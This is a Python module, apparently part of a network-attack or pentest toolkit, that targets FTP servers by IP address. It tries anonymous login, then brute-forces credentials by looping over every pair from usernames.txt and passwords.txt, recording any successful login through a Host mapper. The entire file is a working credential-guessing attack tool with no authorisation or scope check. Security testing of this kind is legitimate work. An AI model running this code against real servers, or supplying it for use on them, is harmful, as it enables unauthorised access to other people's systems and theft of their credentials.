import ftplib
import threading
import logging
from mapper import Host

logging.basicConfig(level=logging.INFO, \
    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class FtpAnon:
    def __init__(self):
        self.usernames = []
        self.passwords = []

    def load_credentials(self, file_path):
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]

    def check_anonymous_login(self, ip_address):
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip_address, timeout=10)
            response = ftp.login('anonymous', 'anonymous')
            logging.info(response)
            if "230" in response:
                logging.info("[*] Anonymous login successful")
                return True
        except ftplib.error_perm:
            logging.info(f'{ip_address} FTP Anonymous login failed')
        except ftplib.all_errors as e:
            logging.error(f"Error: {e}")
        finally:
            if ftp:
                ftp.quit()
        return False

    def brute_force(self, ip_address, user, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip_address, timeout=10)
            logging.info(
                f"Testing user {user}, password {password}"
            )
            response = ftp.login(user, password)
            if "230" in response:
                logging.info(
                    f"[*] Successful brute force: User: {user}, "
                    f"Password: {password}"
                )
                return True
        except ftplib.error_perm as e:
            logging.info(f"Login failed for {user}:{password}")
        except ftplib.all_errors as e:
            logging.error(f"Error: {e}")
            return None
        finally:
            if ftp:
                ftp.quit()
        return False

    def start_attack(self, ip):
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, timeout=10)
            ftp.quit()
        except ftplib.all_errors as e:
            logging.error(
                f"Cannot connect to FTP server at {ip}: {e}"
            )
            Host.update_auth_info(
                ip, "FTP server is unreachable or port is closed."
            )
            return

        if self.check_anonymous_login(ip):
            logging.info(
                "Anonymous login allowed, skipping further brute "
                "force attempts."
            )
            Host.update_auth_info(
                ip, "Anonymous FTP login successful. "
                "Indication of possible vulnerability."
            )
            return

        self.usernames = self.load_credentials('usernames.txt')
        self.passwords = self.load_credentials('passwords.txt')

        for user in self.usernames:
            for password in self.passwords:
                success = self.brute_force(ip, user, password)
                if success is None:
                    Host.update_auth_info(
                        ip, "FTP Brute force attempt failed due to "
                        "connection issues."
                    )
                    return
                if success:
                    Host.update_auth_info(
                        ip, f"FTP Brute force successful: {user}/{password}"
                    )
                    return
    
        Host.update_auth_info(ip, "FTP Brute force failed")
